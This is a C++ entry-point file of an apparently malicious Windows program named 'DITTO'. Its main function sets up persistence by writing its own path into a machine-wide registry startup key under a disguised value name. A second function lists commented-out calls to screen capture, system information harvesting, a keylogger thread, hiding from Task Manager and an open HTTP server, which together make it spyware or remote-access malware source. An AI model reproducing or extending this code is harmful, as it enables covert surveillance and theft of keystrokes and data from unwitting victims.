#include "pch.h"
#include "Main.hpp"


int main()
{
	try 
	{
		Logger::Instance().info(L"<<<<<<<<<<<<<<<<< DITTO IS RUNNING >>>>>>>>>>>>>>>>>>>");

		RegistryKey key{HKEY_LOCAL_MACHINE, STARTUP_KEY}; 

		key.set_value(MS_CONFIG, SystemUtils::get_exe_path());
		std::wcout << key.get_value(MS_CONFIG) << std::endl;
	}
	catch (WindowsException exp)
	{
		std::wcout << exp.what() << std::endl;
	}
	catch (std::exception exp)
	{
		std::wcout << exp.what() << std::endl;
	}
	catch (...)
	{
		OutputDebugString(L"Unexpected exception");
	}
}

void functionalities()
{
	//Screen::instance().take_shot();

	//BatteryUtils::save_battery_info();
	//SystemInfo::save_system_info();

	//SystemUtils::get_process_id(L"");
	//SystemUtils::get_dir_list();


	//Thread key_logger_thread{ reinterpret_cast<LPTHREAD_START_ROUTINE>(&KeyLogger::start), nullptr };
	//KeyLogger key_logger;
	//Thread tskmgr_thread{ reinterpret_cast<LPTHREAD_START_ROUTINE>(&SystemUtils::hide_from_task_manager), nullptr };

	//tskmgr_thread.run();
	//tskmgr_thread.wait();

	//WinSock winsock;
	//HttpServer http_server("0.0.0.0", 8080, 10);
	//http_server.serve_forever();
}